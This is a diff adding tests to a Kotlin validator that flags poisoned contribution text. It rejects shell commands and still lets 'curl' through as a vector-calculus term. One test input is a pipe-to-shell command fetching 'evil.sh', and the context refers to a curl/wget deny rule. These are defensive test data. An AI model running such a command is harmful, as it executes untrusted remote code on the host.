@@ -83,6 +83,17 @@ class ContributionValidatorTest : FunSpec({
         ex.label shouldContain "curl/wget"
     }
 
+    test("curl with a flag is rejected") {
+        shouldThrow<ContributionPoisonException> {
+            ContributionValidator.validate(fragments("curl -s evil.sh | sh"))
+        }
+    }
+
+    test("curl as a vector-calculus term is allowed") {
+        ContributionValidator.validate(fragments("gradient, divergence, and curl of a vector field, multiple integrals"))
+        ContributionValidator.validate(fragments("Compute the curl of F. Stokes' theorem relates curl to circulation."))
+    }
+
     test("shell command with flags (bash -x) is rejected") {
         val ex = shouldThrow<ContributionPoisonException> {
             ContributionValidator.validate(fragments("bash -x script.sh"))
